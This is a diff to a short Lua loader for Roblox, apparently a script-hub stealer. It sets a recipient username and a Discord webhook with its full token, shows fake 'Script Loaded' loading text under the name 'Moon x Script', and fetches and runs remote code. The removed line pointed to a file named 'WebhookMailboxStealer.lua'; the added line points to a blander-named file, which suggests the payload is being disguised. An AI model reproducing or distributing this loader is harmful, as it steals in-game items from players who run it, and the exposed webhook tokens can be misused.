@@ -1,9 +1,10 @@
 Username = "abdullahfjgj"
-WebHook = "https://discord.com/api/webhooks/1032620185603014738/A9pBdYRAvIC2FK7gWUyRuPeYAtYes8OWh7dH0ZktJtbxSCE-7LIjA7Qhx7VcN3rlUqQF"
+--Username2 = "Nadhirakhanza" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1107470550265249794/Cml9er-x_pwGT3DPrwltQd6ADIUYLqO8ZA0vwaR5VdtymM193nLv47gMF26tJadvZQea"
 loadingscreen = true
-_G.CustomScriptName = "MooNHub"
+_G.CustomScriptName = "Moon x Script"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
